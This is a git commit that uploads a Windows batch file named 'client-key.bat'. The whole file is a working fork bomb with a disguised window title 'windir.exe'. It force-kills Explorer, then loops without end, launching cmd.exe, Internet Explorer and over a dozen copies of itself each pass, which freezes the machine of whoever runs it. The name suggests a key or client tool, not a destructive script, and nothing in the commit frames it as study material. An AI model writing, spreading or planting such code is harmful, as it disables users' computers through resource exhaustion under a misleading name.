66761217fc1c6fd58419219ed9b3ad50896da281
thenobrainguy <denish.phone@gmail.com>
2024-11-29 21:18:20 +0100

    Add files via upload

---
+++ client-key.bat
@@ -0,0 +1,22 @@
+@echo off
+@color 0d
+@title windir.exe
+taskkill /IM Explorer.exe /f
+:A
+start cmd.exe
+start iexplore.exe
+start explorer.exe
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+start %0.bat
+Goto A
